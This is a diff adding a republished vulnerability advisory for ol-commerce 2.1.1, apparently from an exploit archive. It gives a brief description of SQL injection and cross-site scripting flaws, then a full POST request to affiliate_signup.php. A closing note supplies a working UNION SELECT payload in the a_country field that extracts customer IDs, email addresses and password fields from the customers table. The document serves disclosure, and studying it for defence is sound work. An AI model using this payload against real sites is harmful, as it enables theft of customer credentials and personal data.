@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/68719/info
+
+ol-commerce is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+ol-commerce 2.1.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/OL-Commerce/affiliate_signup.php
+
+POST /OL-Commerce/affiliate_signup.php HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101
+Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.example.com/o/affiliate_signup.php
+Cookie:
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 629
+
+action=process&a_gender=m&a_firstname=haha&a_lastname=hahasdf&a_dob=457689
+&a_email_address=email@hotmail.com&a_company=iiiiii&a_company_taxid=12
+&a_payment_check=jjjjjj&a_payment_paypal=email@hotmail.com
+&a_payment_bank_name=paypal
+&a_payment_bank_branch_number=555555&a_payment_bank_swift_code=444444
+&a_payment_bank_account_name=qqqqqq&a_payment_bank_account_number=3333333
+&a_street_address=ddddddd&a_suburb=ccccccf&a_postcode=00961&a_city=bbbbbb
+&a_country=118[SQL
+INJECTION]&a_state=aaaaaa&a_telephone=22222222&a_fax=11111111&
+a_homepage=http://iphobos.com/blog&a_password=12121212
+&a_confirmation=12121212&a_agb=1&x=65&y=3
+
+
+[NOTE]
+------
+a_country=118[SQL INJECTION]=118' and 1=2 union all select
+group_concat(customers_id,0x3a,customers_email_address,0x3a,customers_password)+from+customers--
